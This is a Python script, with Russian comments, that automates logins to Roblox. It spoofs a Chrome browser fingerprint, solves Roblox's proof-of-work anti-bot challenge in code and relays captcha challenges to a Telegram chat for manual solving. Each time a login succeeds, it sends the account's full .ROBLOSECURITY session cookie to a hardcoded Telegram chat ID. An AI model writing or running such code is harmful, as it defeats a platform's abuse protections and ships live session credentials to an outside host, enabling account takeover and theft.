"""
tests.py — Тестовый скрипт для ловли капчи Roblox (с циклом 10 попыток).
"""
import json
import base64
import time
import os
import requests
from curl_cffi import requests as curl_requests

# Telegram
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "708684405")
TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"

# Roblox
SESSION = curl_requests.Session(impersonate="chrome123")
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/",
})


def tg_send(text):
    try:
        payload = {"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "HTML"}
        resp = requests.post(f"{TG_API}/sendMessage", json=payload, timeout=10)
        if resp.status_code == 200:
            print(f"[TG] Сообщение отправлено")
        else:
            print(f"[TG] Ошибка отправки: {resp.text[:100]}")
    except Exception as e:
        print(f"[TG] Ошибка: {e}")


def get_fresh_csrf():
    resp = SESSION.post("https://auth.roblox.com/v2/login", json={}, timeout=10)
    csrf = resp.headers.get("x-csrf-token", "")
    if csrf:
        print(f"[CSRF] Получен новый токен: {csrf[:20]}...")
    return csrf


def solve_pow(N_str, A, T):
    N = int(N_str)
    val = A % N
    for _ in range(T):
        val = (val * val) % N
    return str(val)


def attempt_login(username, password):
    print(f"[LOGIN] Попытка входа для {username}...")
    
    csrf = get_fresh_csrf()
    if not csrf:
        return {"status": "error", "message": "Не удалось получить CSRF токен"}
    
    resp = SESSION.post(
        "https://auth.roblox.com/v2/login",
        json={"ctype": "Username", "cvalue": username, "password": password},
        headers={"x-csrf-token": csrf},
        timeout=10
    )
    
    print(f"[LOGIN] HTTP {resp.status_code}")
    
    if ".ROBLOSECURITY" in resp.cookies:
        return {"status": "success", "cookie": resp.cookies[".ROBLOSECURITY"]}
    
    if resp.status_code == 403:
        chall_id = resp.headers.get("rblx-challenge-id", "")
        chall_meta_b64 = resp.headers.get("rblx-challenge-metadata", "")
        
        if not chall_id or not chall_meta_b64:
            return {"status": "error", "message": f"403 без challenge: {resp.text[:200]}"}
        
        try:
            metadata = json.loads(base64.b64decode(chall_meta_b64))
        except Exception as e:
            return {"status": "error", "message": f"Ошибка декодирования metadata: {e}"}
        
        has_blob = bool(metadata.get("data") or metadata.get("dataBlob"))
        chall_type = metadata.get("type", "").lower()
        print(f"[CHALLENGE] Тип: {chall_type or 'неизвестен'}, dataBlob: {'есть' if has_blob else 'нет'}")
        
        if has_blob:
            return {"status": "captcha", "challenge_id": chall_id, "metadata": metadata}
        else:
            return {"status": "pow", "challenge_id": chall_id, "metadata": metadata}
    
    return {"status": "error", "message": f"HTTP {resp.status_code}: {resp.text[:200]}"}


def solve_pow_challenge(username, password, challenge_id, metadata):
    session_id = metadata.get("sessionId", "")
    if not session_id:
        return {"status": "error", "message": "Нет sessionId в metadata"}
    
    pw_url = "https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle"
    
    print(f"[POW] Получение задачи...")
    puzzle_resp = SESSION.get(f"{pw_url}?sessionID={session_id}", timeout=10)
    if puzzle_resp.status_code != 200:
        return {"status": "error", "message": f"Не удалось получить puzzle: HTTP {puzzle_resp.status_code}"}
    
    puzzle = puzzle_resp.json()
    artifacts = json.loads(puzzle.get("artifacts", "{}"))
    N_str = artifacts.get("N", "")
    A = int(artifacts.get("A", 0))
    T = int(artifacts.get("T", 0))
    
    print(f"[POW] Решение: N_len={len(N_str)}, A={A}, T={T}")
    solution = solve_pow(N_str, A, T)
    
    print(f"[POW] Отправка решения...")
    csrf_solve = get_fresh_csrf()
    solve_resp = SESSION.post(
        pw_url,
        json={"sessionID": session_id, "solution": solution, "prefix": ""},
        headers={"x-csrf-token": csrf_solve},
        timeout=10
    )
    
    print(f"[POW] HTTP {solve_resp.status_code}")
    if solve_resp.status_code != 200:
        return {"status": "error", "message": f"PoW submit failed: {solve_resp.text[:200]}"}
    
    solve_data = solve_resp.json()
    redemption_token = solve_data.get("redemptionToken", "")
    if not redemption_token:
        return {"status": "error", "message": "Нет redemptionToken в ответе"}
    
    print(f"[POW] Redemption token получен")
    
    print(f"[POW] Финальная попытка входа...")
    csrf_final = get_fresh_csrf()
    retry_hdrs = {
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/login",
        "x-csrf-token": csrf_final,
        "rblx-challenge-id": challenge_id,
        "rblx-challenge-type": "proofofwork",
        "rblx-challenge-redemption-token": redemption_token,
    }
    
    retry = SESSION.post(
        "https://auth.roblox.com/v2/login",
        json={"ctype": "Username", "cvalue": username, "password": password},
        headers=retry_hdrs,
        timeout=10
    )
    
    print(f"[POW] Retry HTTP {retry.status_code}")
    
    if ".ROBLOSECURITY" in retry.cookies:
        return {"status": "success", "cookie": retry.cookies[".ROBLOSECURITY"]}
    
    return {"status": "error", "message": f"Retry failed: {retry.text[:200]}"}


def send_captcha_to_telegram(challenge_id, metadata, username):
    data_blob = metadata.get("data", "") or metadata.get("dataBlob", "")
    session_id = metadata.get("sessionId", "")
    
    text = f"🔐 <b>КАПЧА ROBLOX</b>\n\n👤 Аккаунт: <code>{username}</code>\n🆔 Challenge ID: <code>{challenge_id}</code>\n\n"
    
    if data_blob:
        text += f"📦 <b>DataBlob:</b>\n<code>{data_blob}</code>\n\nОткрой <code>captcha.html</code> в браузере, вставь DataBlob и реши капчу."
    elif session_id:
        text += f"🔗 <b>Session ID:</b>\n<code>{session_id}</code>"
    else:
        text += f"⚠️ Нет dataBlob или sessionId.\n\nMetadata:\n<code>{json.dumps(metadata, indent=2)}</code>"
    
    tg_send(text)


def hunt_captcha(username, password, max_attempts=10, delay=3):
    print(f"\n🎯 Начинаю охоту на капчу ({max_attempts} попыток)...")
    
    for attempt in range(1, max_attempts + 1):
        print(f"\n--- ПОПЫТКА {attempt}/{max_attempts} ---")
        result = attempt_login(username, password)
        status = result.get("status")
        
        if status == "success":
            print(f"\n✅ УСПЕХ!")
            print(f"Cookie: {result['cookie'][:50]}...")
            tg_send(f"✅ <b>УСПЕХ!</b>\n\nАккаунт: <code>{username}</code>\nCookie: <code>{result['cookie']}</code>")
            return result
            
        elif status == "pow":
            print(f"\n🧮 Получен PoW challenge. Решаю автоматически...")
            pow_result = solve_pow_challenge(username, password, result["challenge_id"], result["metadata"])
            if pow_result.get("status") == "success":
                print(f"\n✅ УСПЕХ после PoW!")
                tg_send(f"✅ <b>УСПЕХ после PoW!</b>\n\nАккаунт: <code>{username}</code>\nCookie: <code>{pow_result['cookie']}</code>")
                return pow_result
            else:
                print(f"❌ Ошибка после PoW: {pow_result.get('message')}")
                # Не прерываем цикл, пробуем снова, если это была временная ошибка
                
        elif status == "captcha":
            print(f"\n🔐 ПОЛУЧЕНА КАПЧА! Отправляю в Telegram...")
            send_captcha_to_telegram(result["challenge_id"], result["metadata"], username)
            print(f"📱 Проверь Telegram!")
            return result
            
        elif status == "error":
            msg = result.get("message", "")
            print(f"⚠️ Ошибка: {msg}")
            if "Incorrect username or password" in msg:
                print("💡 ПОДСКАЗКА: Если пароль неверный, Roblox никогда не покажет капчу. Введи реальные данные.")
        
        if attempt < max_attempts:
            print(f"⏳ Жду {delay} сек перед следующей попыткой...")
            time.sleep(delay)
            
    print("\n❌ Лимит попыток исчерпан. Капча не поймана.")
    return {"status": "error", "message": "Max attempts reached"}


def main():
    print("=" * 60)
    print("ROBLOX CAPTCHA HUNTER")
    print("=" * 60)
    
    username = input("Username: ").strip()
    password = input("Password: ").strip()
    
    if not username or not password:
        print("❌ Username и password не могут быть пустыми")
        return
    
    hunt_captcha(username, password, max_attempts=10, delay=3)
    print("\n" + "=" * 60)


if __name__ == "__main__":
    main()